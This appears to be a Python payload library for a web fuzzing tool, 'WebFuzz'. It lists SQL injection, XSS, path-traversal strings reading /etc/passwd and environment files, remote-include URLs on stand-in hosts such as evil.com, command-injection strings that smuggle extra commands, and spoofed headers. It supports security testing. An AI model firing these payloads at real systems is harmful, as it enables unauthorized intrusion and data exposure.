"""
Payload library for WebFuzz

This file contains categorized payloads used by the fuzzing engine.
You can expand these lists as needed or load external files later.

Categories:
- SQL Injection
- XSS
- LFI / RFI
- Command Injection
- Header Fuzzing
- Basic Noise Payloads
"""

# ----------------------------
# SQL Injection Payloads
# ----------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "admin' --",
    "' OR ''='",
    "' OR '1'='1' /*",
    "') OR ('1'='1",
    "admin' #",
    "1 OR 1=1",
]

# ----------------------------
# XSS Payloads
# ----------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert('XSS')>",
    "<script>confirm(1)</script>",
    "<details open ontoggle=alert(1)>",
]

# ----------------------------
# LFI / RFI Payloads
# ----------------------------
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "/etc/passwd",
    "/proc/self/environ",
    "../windows/win.ini",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://attacker.com/malicious.php",
]

# ----------------------------
# Command Injection Payloads
# ----------------------------
CMDI_PAYLOADS = [
    "; ls",
    "&& whoami",
    "|| id",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
    "; uname -a",
]

# ----------------------------
# Header Fuzzing Payloads
# ----------------------------
HEADER_PAYLOADS = [
    "X-Forwarded-For: 127.0.0.1",
    "X-Originating-IP: 127.0.0.1",
    "X-Remote-IP: 127.0.0.1",
    "Referer: <script>alert(1)</script>",
    "User-Agent: WebFuzzScanner",
    "User-Agent: ' OR '1'='1",
    "X-API-Version: ../../etc/passwd",
]

# ----------------------------
# Basic Fuzz Noise Payloads
# ----------------------------
NOISE_PAYLOADS = [
    "AAAAAAA",
    "!!!!@@@###",
    "%00%00%00",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "'\"`",
]

# ----------------------------
# ALL PAYLOADS (for random fuzzing)
# ----------------------------
COMMON_PAYLOADS = (
    SQLI_PAYLOADS
    + XSS_PAYLOADS
    + LFI_PAYLOADS
    + CMDI_PAYLOADS
    + NOISE_PAYLOADS
)
